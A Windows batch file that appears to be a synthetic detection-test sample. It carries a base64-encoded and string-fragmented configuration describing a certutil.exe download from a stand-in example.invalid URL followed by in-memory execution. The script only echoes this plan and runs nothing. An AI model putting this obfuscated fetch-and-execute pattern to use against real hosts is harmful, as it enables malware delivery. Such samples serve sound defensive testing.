@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:base64_literal|identity

rem HUNTRESS-MATERIAL:dj0xfHN0ZXBzPWFjcXVpcmVfcmVtb3RlLGRpc3BhdGNoX21lbW9yeXxhZGFwdGVyPWNlcnR1dGlsLmV4ZXxzdGFnZV9jb3VudD0xfGdyYXBoPWNyb3NzX2xhbmd1YWdlfG5leHRfbGFuZ3VhZ2U9bm9uZXxjYW1wYWlnbl9pZD1jYW1wYWlnbi1kMmVhNWE3NzUwfHVybD1odHRwczovL2QyZWE1YTc3NTAuZXhhbXBsZS5pbnZhbGlkLzhkOTRiNDkxLmRhdA==

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set fragment0=v=1^|steps=acquire_remote,dispatch_memory^|adapter=c
set fragment1=ertutil.exe^|stage_count=1^|graph=cross_language^|nex
set fragment2=t_language=none^|campaign_id=campaign-d2ea5a7750^|ur
set fragment3=l=https://d2ea5a7750.example.invalid/8d94b491.dat

goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE

set "neutral_environment_probe=c4595b6c"

for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
exit /b 0
:HUNTRESS_EMIT

echo(!recovered_configuration!

exit /b 0

:HUNTRESS_PLAN

echo certutil.exe GET https://d2ea5a7750.example.invalid/8d94b491.dat then dispatch memory

exit /b 0

